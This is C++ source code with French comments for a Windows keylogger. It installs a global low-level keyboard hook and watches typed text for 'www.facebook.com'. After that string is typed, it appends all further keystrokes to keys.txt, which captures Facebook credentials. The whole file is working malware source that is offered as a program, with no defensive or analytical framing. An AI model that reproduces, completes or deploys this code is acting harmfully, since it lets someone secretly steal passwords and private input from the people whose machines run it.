#include <Windows.h> 
#include <iostream> 
#include <fstream>

// Déclaration de la variable pour l'enregistrement du hook
HHOOK hhkLowLevelKybd; 

// Déclaration de la chaîne pour enregistrer les caractères entrés
std::string link =""; 

// Nom du fichier pour enregistrer les touches
std::string filename = "keys.txt";

// Chaîne pour vérifier si l'utilisateur est sur Facebook
std::string FB ="www.facebook.com"; 

// Convertit le code VK en caractère
std::string ConvertVKCodeToCharacter(int keyCode) {
    std::string character;
    BYTE keyboardState[256];
    WORD asciiCharacter; 
    GetKeyboardState(keyboardState); 
    ToAscii(keyCode, 0, keyboardState, &asciiCharacter, 0);
    character.push_back(char(asciiCharacter)); 
    return character;    
}

// Vérifie si un fichier existe
inline bool is_file_exist (const std::string& name) {
    if (FILE *file = fopen(name.c_str(), "r")) {
        fclose(file);
        return true;
    } else {
        return false;
    }
};  

// Crée un fichier s'il n'existe pas
void create_file(std::string filename) { 
    std::ofstream outfile (filename);
    if(outfile) {
        outfile.close();
    }
}

// Enregistre les touches entrées dans le fichier
void savingKeysToFile(std::string s,std::string filename){
    std::ofstream outfile; 
    outfile.open(filename, std::ios_base::app); 
    outfile << s ; 
    outfile.close(); 
}

// Convertit la chaîne en minuscule
std::string toLowerCase(std::string str) {
    for (int i=0; str[i]!='\0'; i++) {
        if (str[i] >= 'A' && str[i] <= 'Z') 
            str[i] = str[i] + 32; 
    } 
    return str; 
} 

// Fonction de rappel pour le hook de clavier
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { 
    if (nCode == HC_ACTION) { 
        switch (wParam) { 
            case WM_KEYDOWN: 
                KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam); 

                // Si l'utilisateur n'est pas sur Facebook, ajoute les caractères entrés à la chaîne
                if(link != FB){
                    if (link.size() < 16 ){
                        link += toLowerCase(ConvertVKCodeToCharacter(cKey.vkCode)) ; 
                    }else{
                        link= link.substr(1, link.size()) + toLowerCase(ConvertVKCodeToCharacter(cKey.vkCode));
                    }
                }
                // Si l'utilisateur est sur Facebook, enregistre les touches entrées dans un fichier
                else{
                if(!is_file_exist(filename)){
                    create_file(filename);
                }
                savingKeysToFile(ConvertVKCodeToCharacter(cKey.vkCode),filename);
                }
                break;
        }
    }
    return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}
int main() {
    std::cout << " Le programme fonctionne ! Commencez a taper ... \n";
    
    // Enregistrement du hook de clavier
    hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    if (!hhkLowLevelKybd)
    std::cout << "Echec de l'installation du hook!" << std::endl;

    // Boucle principale pour la réception des messages
    MSG Message;
    while (GetMessage(&Message, NULL, 0, 0) > 0) {
        TranslateMessage(&Message);
        DispatchMessage(&Message);
    }
return 0;
}